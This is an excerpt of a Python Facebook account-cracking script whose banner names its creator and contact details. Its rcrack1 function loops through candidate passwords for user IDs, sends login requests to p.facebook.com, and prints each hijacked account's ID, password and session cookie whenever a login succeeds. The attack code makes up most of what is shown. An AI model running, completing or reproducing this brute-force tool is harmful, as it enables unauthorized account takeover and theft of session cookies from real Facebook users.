...
\033[1;91m--------------------------------------------
\033[1;91m[✓] CREATOR   > MOHAMMAD SOHAN
\033[1;91m[✓] FACEBOOK  > MOHAMMAD SOHAN
\033[1;91m[✓] GITHUB    > Itz-S4H6N
\033[1;91m[✓] WHATSAPP  > +1 (505) 5150701
\033[1;91m--------------------------------------------""")
...
def gml():
    ...
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/itZ.sohan.vau.error.max.10')
    print(logo)
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mSOHAN\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
 ...
 'authority': 'p.facebook.com',
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[SOHAN-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[SOHAN-KING🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()